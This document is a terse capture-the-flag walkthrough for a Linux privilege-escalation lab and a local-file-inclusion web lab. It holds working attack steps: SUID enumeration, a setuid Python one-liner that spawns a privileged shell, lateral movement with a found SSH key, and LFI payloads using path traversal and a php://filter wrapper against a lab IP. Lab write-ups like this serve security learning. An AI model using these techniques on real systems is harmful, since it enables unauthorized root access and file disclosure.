# Linux Fundamentals / Privesc challenge

### Flag 1
- ssh in
- `ls`

### Flag 2
- `cd look-in-here`
- `cat flag2.txt`

### Flag 3
- `ls -la`
- `cd also/in/here` 
- `cat .flag3` 

### Flag 4
- `find . -name "flag4.txt" -print 2>/dev/null`
- `cat ./var/backups/.my/secret/backup/folder/is/here/flag4.txt`

### Flag 5
- `sudo -l`
- `sudo -u flag5 /bin/bash`
- `cd home -> flag5 -> cat flag5.txt`

### Flag 6
- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- `(find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null)`
- `cd /opt/bins`
- `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                                                                                                 
- `cd /home -> /flag6 -> cat flag6.txt`                                                                                                                      

### Flag 7                                                                                                                                                         
- `ls -la`                                                                                                                                                   
- `cd .ssh`                                                                                                                                                  
- `ssh -i /home/flag6/.ssh/id_flag7 flag7@127.0.0.1`                                                                                                         


# LOFI challenges
https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers

### Flag 1
- http://10.128.238.88/?page=/var/www/html/../../../flag.txt

### Flag 2
- http://10.128.238.88/?page=php://filter/convert.base64-encode/resource=flag.php


